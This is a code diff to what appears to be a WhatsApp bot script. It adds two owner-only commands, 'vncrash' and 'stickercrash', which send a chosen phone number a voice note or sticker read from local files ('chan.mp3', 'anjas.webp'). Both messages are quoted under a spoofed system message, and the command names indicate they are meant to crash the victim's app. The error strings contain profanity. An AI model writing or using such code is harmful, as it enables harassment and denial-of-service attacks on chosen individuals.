@@ -1910,6 +1910,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
 ⭔ ${prefix}gasbro -Nomer
 ⭔ ${prefix}gasbtt -Nomer
 ⭔ ${prefix}sendreaksi -Nomer
+⭔ ${prefix}stickercrash -Nomer
+⭔ ${prefix}vncrash -Nomer
 
 
  *GROUP MENU*
@@ -2426,6 +2428,46 @@ adehvn = {
     }
  hey = fs.readFileSync('anjas.webp')
 tebece.sendImageAsSticker(m.chat, hey, adehvn, { packname: global.packname, author: global.author })
+break
+case 'vncrash':
+if (!isCreator) throw mess.owner
+if (!text) throw `MANA NOMERNYA KONTOL`
+adehvn = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `kontol`, 
+                "jpegThumbnail": thumb
+            } 
+        } 
+    }
+ hey = fs.readFileSync('chan.mp3')
+ tebece.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
+break
+case 'stickercrash':
+if (!isCreator) throw mess.owner
+if (!text) throw `MANA NOMERNYA KONTOL`
+adehvn = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "imageMessage": { 
+                "mimetype": "image/jpeg", 
+                "caption": `kontol`, 
+                "jpegThumbnail": thumb
+            } 
+        } 
+    }
+ hey = fs.readFileSync('anjas.webp')
+tebece.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
 break
             default:
                 if (budy.startsWith('=>')) {
